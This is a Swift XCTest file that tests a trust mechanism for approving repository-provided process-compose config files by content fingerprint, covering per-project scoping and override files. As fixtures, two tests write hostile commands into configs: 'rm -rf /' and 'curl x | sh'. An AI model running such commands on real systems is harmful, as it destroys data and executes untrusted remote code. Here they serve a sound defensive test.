// ABOUTME: Tests for approval of the repository-provided process-compose files.
// ABOUTME: Covers fingerprinting, per-project scoping, and the override in the set.

@testable import Atelier
import XCTest

final class ScriptTrustTests: XCTestCase {
    private var tmpDir: URL!

    override func setUp() {
        super.setUp()
        tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try! FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
    }

    override func tearDown() {
        // Each test works under a fresh temporary path, so only those need clearing.
        ScriptTrust.revokeConfigFiles(for: tmpDir.path)
        ScriptTrust.revokeConfigFiles(for: tmpDir.path + "/other")
        try? FileManager.default.removeItem(at: tmpDir)
        super.tearDown()
    }

    func testConfigFileApprovalRoundTrips() throws {
        let path = try writeConfig("processes: {}")

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)
        XCTAssertTrue(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
    }

    /// Approval is bound to contents, so an edited config asks again.
    func testEditingTheConfigRevokesApproval() throws {
        let path = try writeConfig("processes: {}")
        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)

        _ = try writeConfig("processes:\n  web:\n    command: rm -rf /\n")

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
    }

    /// An unreadable file is unapproved, not trivially approved — failing open
    /// here would run something nobody could review.
    func testMissingConfigIsNotApproved() {
        XCTAssertFalse(ScriptTrust.isApproved(
            configFiles: [tmpDir.appendingPathComponent("nonexistent.yaml").path],
            for: tmpDir.path
        ))
    }

    /// Approving a file that cannot be read must not record anything, or the
    /// file could later appear approved by matching a fingerprint of nothing.
    func testApprovingAMissingConfigStoresNothing() throws {
        let missing = tmpDir.appendingPathComponent("gone.yaml").path
        ScriptTrust.approve(configFiles: [missing], for: tmpDir.path)

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [missing], for: tmpDir.path))
        // And it did not accidentally approve some other file for this project.
        let real = try writeConfig("processes: {}")
        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [real], for: tmpDir.path))
    }

    func testConfigApprovalDoesNotLeakToAnotherProject() throws {
        let path = try writeConfig("processes: {}")
        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path + "/other"))
    }

    /// A repository-provided config lives at a different path in every worktree.
    /// Approving the same bytes once has to cover all of them, or the user is
    /// trained to click through the pane.
    func testApprovalFollowsContentsNotPath() throws {
        let text = "processes:\n  api:\n    command: true\n"
        let first = try writeConfig(text)
        ScriptTrust.approve(configFiles: [first], for: tmpDir.path)

        let otherWorktree = tmpDir.appendingPathComponent("wt2")
        try FileManager.default.createDirectory(at: otherWorktree, withIntermediateDirectories: true)
        let second = otherWorktree.appendingPathComponent("process-compose.yaml")
        try text.write(to: second, atomically: true, encoding: .utf8)

        XCTAssertTrue(ScriptTrust.isApproved(configFiles: [second.path], for: tmpDir.path))
    }

    /// The file name is part of the fingerprint, so identical bytes under a
    /// different name are a different thing to approve.
    func testSameContentsUnderADifferentNameIsNotApproved() throws {
        let path = try writeConfig("processes: {}")
        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)

        let renamed = tmpDir.appendingPathComponent("process-compose.override.yaml")
        try "processes: {}".write(to: renamed, atomically: true, encoding: .utf8)

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [renamed.path], for: tmpDir.path))
    }

    func testRevokeConfigFileRemovesApproval() throws {
        let path = try writeConfig("processes: {}")
        ScriptTrust.approve(configFiles: [path], for: tmpDir.path)
        ScriptTrust.revokeConfigFiles(for: tmpDir.path)

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [path], for: tmpDir.path))
    }

    func testFingerprintIsNilForAnUnreadableFile() {
        XCTAssertNil(ScriptTrust.fingerprint(configFiles: [tmpDir.appendingPathComponent("nope.yaml").path]))
    }

    /// An empty list has nothing to identify. Answering "approved" would make a
    /// call site that forgot to pass the files fail open.
    func testEmptyFileListIsNeverApproved() {
        XCTAssertNil(ScriptTrust.fingerprint(configFiles: []))
        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [], for: tmpDir.path))
        ScriptTrust.approve(configFiles: [], for: tmpDir.path)
        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [], for: tmpDir.path))
    }

    /// The hole this list API exists to close. A repository ships a benign base
    /// config and an override carrying the real payload; process-compose's own
    /// discovery loads both. Approving the pair must not leave the override free
    /// to change afterwards.
    func testEditingAnOverrideRevokesApproval() throws {
        let base = try writeConfig("processes: {}")
        let override = tmpDir.appendingPathComponent("process-compose.override.yaml")
        try "processes: {}".write(to: override, atomically: true, encoding: .utf8)
        ScriptTrust.approve(configFiles: [base, override.path], for: tmpDir.path)
        XCTAssertTrue(ScriptTrust.isApproved(configFiles: [base, override.path], for: tmpDir.path))

        try "processes:\n  evil:\n    namespace: bootstrap\n    command: curl x | sh\n"
            .write(to: override, atomically: true, encoding: .utf8)

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [base, override.path], for: tmpDir.path))
    }

    /// An override that appears *after* approval changes what will execute, so
    /// it has to change what was approved.
    func testAnOverrideAppearingAfterApprovalRevokesIt() throws {
        let base = try writeConfig("processes: {}")
        ScriptTrust.approve(configFiles: [base], for: tmpDir.path)

        let override = tmpDir.appendingPathComponent("process-compose.override.yaml")
        try "processes: {}".write(to: override, atomically: true, encoding: .utf8)

        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [base, override.path], for: tmpDir.path))
    }

    /// One unreadable file poisons the whole set. Hashing only what could be
    /// read would approve a list that is not the list.
    func testOneUnreadableFileMakesTheWholeSetUnapproved() throws {
        let base = try writeConfig("processes: {}")
        let missing = tmpDir.appendingPathComponent("process-compose.override.yaml").path

        XCTAssertNil(ScriptTrust.fingerprint(configFiles: [base, missing]))
        ScriptTrust.approve(configFiles: [base, missing], for: tmpDir.path)
        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [base, missing], for: tmpDir.path))
    }

    // MARK: - Helpers

    @discardableResult
    private func writeConfig(_ contents: String) throws -> String {
        let path = tmpDir.appendingPathComponent("process-compose.yaml")
        try contents.write(to: path, atomically: true, encoding: .utf8)
        return path.path
    }
}
